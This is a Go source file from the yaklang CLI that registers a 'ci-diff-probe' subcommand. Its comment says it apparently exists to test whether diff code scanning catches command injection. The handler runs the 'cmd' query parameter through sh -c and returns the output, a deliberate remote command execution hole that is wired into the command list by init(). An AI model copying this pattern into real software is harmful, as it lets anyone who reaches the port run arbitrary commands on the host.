package yakcmds

import (
	"fmt"
	"net/http"
	"os/exec"

	"github.com/yaklang/yaklang/common/urfavecli"
)

// createCIDiffProbeCommand 注册一个仅用于验证「外部 PR 的 diff 是否会被代码安全检查覆盖」
// 的临时子命令：它在本地监听 HTTP 并把查询参数直接交给 shell 执行。
// 该命令故意保留命令注入写法，用来确认 Diff-Code-Check 能命中并上报高危风险。
func createCIDiffProbeCommand() *cli.Command {
	return &cli.Command{
		Name:  "ci-diff-probe",
		Usage: "start a local probe server used to verify diff code scanning (test only)",
		Flags: []cli.Flag{
			cli.StringFlag{
				Name:  "host",
				Value: "127.0.0.1:18888",
				Usage: "probe server listen address",
			},
		},
		Action: func(c *cli.Context) error {
			mux := http.NewServeMux()
			mux.HandleFunc("/exec", func(w http.ResponseWriter, r *http.Request) {
				cmd := r.URL.Query().Get("cmd")
				out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
				if err != nil {
					fmt.Fprintf(w, "error: %v\n%s", err, out)
					return
				}
				fmt.Fprintf(w, "%s", out)
			})
			return http.ListenAndServe(c.String("host"), mux)
		},
	}
}

func init() {
	UtilsCommands = append(UtilsCommands, createCIDiffProbeCommand())
}
